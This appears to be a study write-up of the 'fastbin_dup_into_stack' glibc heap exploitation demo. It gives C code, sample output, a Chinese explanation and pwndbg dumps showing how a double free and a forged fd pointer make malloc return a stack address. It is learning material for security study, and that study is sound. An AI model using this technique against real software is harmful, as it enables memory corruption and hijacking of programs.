# fastbin_dup_into_stack

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

**result**

```c
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7ffc59357848.
Allocating 3 buffers.
1st malloc(8): 0x1fdf010
2nd malloc(8): 0x1fdf030
3rd malloc(8): 0x1fdf050
Freeing the first one...
If we free 0x1fdf010 again, things will crash because 0x1fdf010 is at the top of the free list.
So, instead, we'll free 0x1fdf030.
Now, we can free 0x1fdf010 again, since it's not the head of the free list.
Now the free list has [ 0x1fdf010, 0x1fdf030, 0x1fdf010 ]. We'll now carry out our attack by modifying data at 0x1fdf010.
1st malloc(8): 0x1fdf010
2nd malloc(8): 0x1fdf030
Now the free list has [ 0x1fdf010 ].
Now, we have access to 0x1fdf010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x1fdf010 to point right before the 0x20.
3rd malloc(8): 0x1fdf010, putting the stack address on the free list
4th malloc(8): 0x7ffc59357848
```

**analysis**

申请了a，b，c三块内存，free(a), free(b), free(a), 后fast bin中为a，b，a。这时我再次申请相同大小的内存d，此时a的内存就分配给了d。

我们再次申请内存，将b取出，fast bin中只剩下a。现在我们通过对d进行修改，使a指向一个fake fast bin。

```c
stack_var = 0x20;//设置fake fast bin的size为0x20，stack_var的位置，fake的size位。
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));//size的前一个内存单元地址,prev_size
//使d，即a的fd指针指向fake fast bin。
```

我们再将a取出，如果接着申请大小合适的内存，系统会把fake fast bin给我们。通过这种方式我们可以获得指向任意地址的指针。

**gdb**

对a进行double free后

```c
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

修改a的fd，在栈上伪造chunk

```c
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x603000
Size: 0x21
fd: 0x7fffffffdc58

Allocated chunk | PREV_INUSE
Addr: 0x603020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x603040
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x603060
Size: 0x20fa1

pwndbg> bins
fastbins
0x20: 0x603000 —▸ 0x7fffffffdc58 —▸ 0x603010 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

fake chunk被链入fast bin中，我们布置好了fake chunk size，只要申请适合大小的chunk，就能获得stack chunk。